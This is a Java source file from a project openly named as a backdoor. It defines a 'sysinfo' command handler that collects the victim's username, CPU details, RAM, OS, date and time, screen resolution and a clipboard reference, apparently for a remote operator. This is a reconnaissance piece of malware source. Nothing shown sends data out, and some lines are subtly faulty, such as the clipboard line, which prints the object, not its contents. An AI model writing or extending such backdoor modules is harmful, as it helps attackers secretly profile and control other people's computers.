package net.jaguargaming.backdoor.commandhandlers;

import java.awt.Toolkit;

import org.hyperic.sigar.Sigar;
import org.hyperic.sigar.SigarException;

public class CMDsysinfo {
	
	public static String[] handle(String[] args) throws IllegalArgumentException, SigarException {
		if (args.length != 0) {
			throw new IllegalArgumentException("Wrong argument length");
		}
		String[] sysInfo = new String[9];
		try {
			Sigar sigar = new Sigar();
			sysInfo[0] = "[" + System.getProperty("user.name") + "] [SysInfo] CPU: " + sigar.getCpuInfoList()[0].getVendor() + sigar.getCpuInfoList()[0].getModel();
			sysInfo[1] = "[" + System.getProperty("user.name") + "] [SysInfo] CPU Cores: " + System.getenv("NUMBER_OF_PROCESSORS");
			sysInfo[2] = "[" + System.getProperty("user.name") + "] [SysInfo] CPU Clock Speed: " + sigar.getCpuInfoList()[0].getMhz() + " MHz";
			sysInfo[3] = "[" + System.getProperty("user.name") + "] [SysInfo] RAM: " + sigar.getMem().getTotal() / 1024 / 1024 / 1024 + " GB";
			sysInfo[4] = "[" + System.getProperty("user.name") + "] [SysInfo] OS: " + System.getProperty("os.name");
			sysInfo[5] = "[" + System.getProperty("user.name") + "] [SysInfo] System Date: " + System.getenv("DATE");
			sysInfo[6] = "[" + System.getProperty("user.name") + "] [SysInfo] System Time: " + System.getenv("TIME");
			sysInfo[7] = "[" + System.getProperty("user.name") + "] [SysInfo] Screen Resolution: " + Toolkit.getDefaultToolkit().getScreenSize().width + " x " + Toolkit.getDefaultToolkit().getScreenSize().height;
			sysInfo[8] = "[" + System.getProperty("user.name") + "] [SysInfo] System Clipboard: " + Toolkit.getDefaultToolkit().getSystemClipboard();
		} catch (SigarException e) {
			throw e;
		}
		return sysInfo;
	}
	
}
